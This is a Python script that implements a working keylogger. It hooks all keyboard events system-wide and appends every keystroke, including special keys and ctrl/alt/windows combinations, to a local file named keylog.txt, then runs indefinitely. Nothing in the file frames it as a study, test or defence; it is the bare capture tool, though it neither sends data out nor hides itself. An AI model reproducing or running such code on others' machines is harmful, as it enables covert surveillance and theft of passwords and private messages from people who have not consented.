import keyboard

log_file = "keylog.txt"

special_keys = [
    "enter", "backspace", "space", "tab", "esc",
    "caps lock",
    "left", "right", "up", "down"
] + [f"f{i}" for i in range(1, 13)] # Function keys (F1-F12), now with removed modifier keys.
pressed_modifiers = set()

def special_key_helper(key): # replace the keyname to accurately represent the expected outcome
    if key in special_keys:
        if key == "space": 
            return " "
        elif key == "enter":
            return "\n"
        elif key == "tab":
            return "\t"
        else:
            return "<{}>\n".format(key)
    return key #default case for alphanumeric characters

def on_key_event(event):
    key = event.name
    # print(f"Received key event: {key}, type: {event.event_type}")
    entry = ""
    mods = []
    if event.event_type == "down": # accounting for holding down of key
        if key in {"ctrl", "alt", "shift", "windows"}:
            pressed_modifiers.add(key)
        elif len(key) == 1:
            if pressed_modifiers and any(mod in pressed_modifiers for mod in {"ctrl", "alt", "windows"}):
                mods = "+".join(pressed_modifiers)
                entry = f"<{mods}+{key}>\n" 
            else:
                entry = key
            with open(log_file, 'a') as f:
                f.write(entry)
        else:
            entry = special_key_helper(key)
            with open(log_file, 'a') as f:
                f.write(entry)     
    elif event.event_type == "up": # accounting for the release of key holding
        if key in pressed_modifiers:
            pressed_modifiers.remove(key)


keyboard.hook(on_key_event) #change from on key press to record the holding/release

keyboard.wait()